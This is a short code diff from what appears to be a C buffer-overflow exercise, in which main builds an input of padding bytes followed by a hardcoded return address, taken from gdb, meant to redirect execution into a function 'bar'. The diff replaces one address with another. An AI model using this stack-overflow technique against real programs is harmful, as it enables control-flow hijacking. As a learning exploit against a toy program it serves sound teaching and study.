@@ -17,7 +17,8 @@ void foo(char *input) {
 int main() {
     // This input is crafted to cause a buffer overflow
     // It will need to be adjusted based on the memory layout of the program
-    char input[] = "AAAAAAAAAAAAAAAAAA\x69\x51\x55\x55\x55\x55\x00\x00"; //address obtained through gdb debugging p &bar
+    //char input[] = "AAAAAAAAAAAAAAAAAA\x69\x51\x55\x55\x55\x55\x00\x00"; //address obtained through gdb debugging p &bar
+    char input[] = "AAAAAAAAAAAAAAAAAA\x56\x11\x40\x00\x00\x00\x00\x00";
 
     foo(input);
 
